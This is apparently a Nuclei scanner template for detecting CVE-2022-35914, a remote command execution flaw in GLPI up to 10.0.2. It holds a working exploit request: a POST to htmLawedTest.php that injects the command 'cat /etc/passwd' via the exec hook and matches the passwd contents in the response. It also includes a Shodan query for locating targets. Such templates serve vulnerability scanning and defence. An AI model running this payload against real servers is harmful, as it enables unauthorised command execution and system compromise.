id: CVE-2022-35914
info:
  name: GLPI <=10.0.2 - Remote Command Execution
  author: For3stCo1d
  severity: critical
  description: The vulnerability CVE-2022-35914 exposes GLPI versions up to 10.0.2
    to the risk of remote command execution via an injection in htmLawedTest.php within
    the htmlawed module.
  reference:
  - https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914
  - https://github.com/cosad3s/CVE-2022-35914-poc
  - http://www.bioinformatics.org/phplabware/sourceer/sourceer.php?&Sfs=htmLawedTest.php&Sl=.%2Finternal_utilities%2FhtmLawed
  - https://nvd.nist.gov/vuln/detail/CVE-2022-35914
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-35914
    cwe-id: CWE-74
  metadata:
    shodan-query: http.favicon.hash:"-1474875778"
    verified: 'true'
    impact: The vulnerability CVE-2022-35914 in GLPI <=10.0.2 could potentially allow
      remote attackers to execute arbitrary commands and cause significant security
      impact.
    recommendation: It is recommended to update GLPI to version 10.0.3 or higher to
      prevent potential remote command execution attacks.
  tags: cve,cve2022,glpi,rce,kev
variables:
  cmd: cat+/etc/passwd
requests:
- raw:
  - 'POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: sid=foo


    sid=foo&hhook=exec&text={{cmd}}

    '
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
